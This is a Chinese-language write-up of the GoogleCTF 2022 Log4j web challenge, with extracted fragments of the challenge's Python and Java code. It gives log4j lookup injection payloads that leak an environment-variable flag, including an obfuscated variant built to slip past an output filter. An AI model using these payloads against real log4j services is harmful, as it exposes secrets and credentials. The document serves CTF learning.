@Y4tacker
GoogleCTF2022-Log4j
写在前⾯
唯⼀⼀个Java题了，挺有意思的⼀道题学到很多
题⽬附件：https://github.com/google/google-ctf/tree/master/2022/web-log4j
⾮预期分析
题⽬给了⼀个公⽹环境(题⽬似乎没有重启，能猜到不可能是RCE)以及附件压缩包，⾥⾯同时
有python以及java的环境，先简单看看python的，这⾥运⾏了web服务，将输⼊作为分割传⼊
chat函数后通过subprocess调⽤命令执⾏并返回结果，这⾥不存在命令注⼊
app = Flask(__name__)
@app.route("/", methods=['GET', 'POST'])
def start():
    if request.method == 'POST':
        text = request.form['text'].split(' ')
        cmd = ''
        if len(text) 
这⾥说⼀下其中⼀个就可以，也就是这
个 org.apache.logging.log4j.core.lookup.ResourceBundleLookup ，要执
⾏ LOGGER.warn 只需要满⾜下⾯两个条件之⼀即可，这⾥简单测试⼀下 ${bundle:2333}
发现这个LOGGER确实能将关键信息带到标准输出
因此我们只需要输⼊ ${bundle:${env:FLAG}} 即可
预期分析-redos
猜测可能是⾮预期了所以搞了个新的题，将同样的payload输⼊后页⾯只是显⽰ Sensitive 
information detected in output. Censored for security reasons.
这⾥会检测内容，根据猜测能够知道肯定是把那个ResourceBundleLookup下的 LOGGER.warn
的输出特征给过滤掉了，这⾥简单fuzz下证实了我的猜测，毕竟这⾥是有doCommand功能
${${a:-b}undle:${env:FLAG}}
  private static void doCommand(String cmd, String[] args) {
只需要通过repeat功能即可，成功验证了猜想，因此不需要考虑payload的问题了
    switch(cmd) {
      case "help":
        doHelp();
        break;
      case "repeat":
        System.out.println(args[1]);
        break;
      case "time":
        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/M/d 
H:m:s");
        System.out.println(dtf.format(LocalDateTime.now()));
        break;
      case "wc":
        if (args[1].isEmpty()) {